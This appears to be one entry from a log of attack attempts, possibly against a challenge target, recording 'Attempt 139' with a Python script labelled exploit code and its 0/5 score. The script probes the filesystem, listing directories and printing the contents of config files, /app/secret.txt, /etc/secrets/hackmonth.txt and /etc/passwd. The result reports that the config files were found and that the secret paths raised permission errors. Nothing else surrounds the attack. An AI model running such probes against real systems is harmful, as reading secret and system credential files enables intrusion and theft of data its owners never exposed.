# Attempt 139 - 2026-06-07T10:17:45.324895+00:00
## Template: F | Score: 0 - Nothing - file probe
## Exploit code
```python
from pathlib import Path

files_to_read = [
    '/data/config.json',
    '/data/current-config.json',
    '/data/logs/',
    '/data/docs/',
    '/data/i18n/',
    '/app/secret.txt',
    '/etc/secrets/hackmonth.txt',
    '/etc/passwd',
]

for f in files_to_read:
    p = Path(f)
    try:
        if p.is_dir():
            print(f"[DIR] {f}: {list(p.iterdir())[:5]}")
        elif p.is_file():
            content = p.read_text()
            print(f"[FILE] {f}: {content[:200]}")
        else:
            print(f"[MISS] {f}")
    except Exception as e:
        print(f"[ERR]  {f}: {e}")
```

## Result
Context: Template F Config Enum - probed /data and secret paths. Found config files, logs, docs. Secret paths PermissionError
Score: 0/5 - Nothing - file probe
